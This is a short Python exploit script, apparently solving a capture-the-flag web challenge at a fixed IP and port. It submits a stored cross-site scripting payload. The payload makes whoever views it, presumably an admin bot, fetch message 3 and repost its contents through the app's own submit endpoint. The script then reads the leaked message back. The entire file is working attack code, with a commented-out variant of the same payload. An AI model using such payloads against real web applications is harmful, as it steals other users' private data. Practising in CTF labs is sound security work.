import requests
from icecream import ic
import time

host = '188.166.171.51:30116'


def get_message(id: str):
    return requests.get(f'http://{host}/message/{id}')

def submit_message(message: str):
    return requests.post(f'http://{host}/submit', json={ 'message': message })


# submit_res1 = submit_message("""<html>
# <body>
# <script>
#     fetch('/message/3')
#         .then(response => response.text()
#         .then(data => 
#             fetch('/submit', {
#                 method: 'POST',
#                 body: JSON.stringify({
#                     message: data,
#                 }),
#                 headers: {
#                     'Content-Type': 'application/json',
#                 },
#             })
#         )
# </script>
# </body>
# </html>""")

submit_res1 = submit_message("""
<script>
    fetch('/message/3')
        .then(response => response.text()
        .then(data => 
            fetch('/submit', {
                method: 'POST',
                body: JSON.stringify({
                    message: data,
                }),
                headers: {
                    'Content-Type': 'application/json',
                },
            })
        )
</script>
""")

ic(submit_res1.status_code)
ic(submit_res1.text)

message_id = int(submit_res1.json()['message'])

time.sleep(5)

get_message1 = get_message(message_id)
ic(get_message1.status_code)
ic(get_message1.text)
get_message2 = get_message(message_id+1)
ic(get_message2.status_code)
ic(get_message2.text)
